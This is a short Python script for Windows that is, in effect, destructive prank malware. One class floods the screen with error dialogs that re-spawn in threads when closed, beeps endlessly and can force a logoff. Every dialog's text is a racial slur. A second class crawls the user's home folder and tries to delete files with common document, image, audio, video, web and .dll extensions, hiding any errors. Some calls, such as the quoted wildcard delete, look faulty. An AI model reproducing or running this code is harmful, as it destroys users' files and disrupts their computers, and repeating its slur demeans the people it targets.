import win32api, win32con
import _thread, random, os

class WNA:

    def __init__(self):
        print(0)

    def messages(self):
        def msg():
            if win32api.MessageBox(None,'NEGRO','c4', win32con.MB_ICONERROR) == 1:
                    _thread.start_new_thread(msg,())
            msg()
        msg()
        while True:
            pass

    def win_sounds(self):
        while True:
            random.choice([win32api.MessageBeep(win32con.MB_OK),win32api.MessageBeep(win32con.MB_ICONERROR)])
            win32api.Sleep(5*10**3)

    def exit_win(self):
        win32api.MessageBox(None, 'NEGRO', 'c4', win32con.MB_ICONERROR)
        win32api.ExitWindows()


class DEL:

    def __init__(self):
        self.V_list = ['C:\\Users\\%s' % win32api.GetUserName()]
        self.extensions = ['.txt', '.doc', '.jpg', '.png', '.docx', '.ppt',
                           '.mp3', '.mp4', '.wav', '.bmp', '.avi', '.obj',
                           '.svg', '.pdf', '.dll', '.html', '.gif']
        self.crawler()
        self.menace()

    def crawler(self):
        for root, dirs, files in os.walk(self.V_list[0]):
            if root is not self.V_list:
                self.V_list.append(root)

    def menace(self):
        try:
            for i in range(len(self.V_list)):
                for j in range(len(self.extensions)):
                    win32api.DeleteFile('"%s\\*%s"' % (self.V_list[i], self.extensions[j]))
        except:
            pass

a = WNA()
a.messages()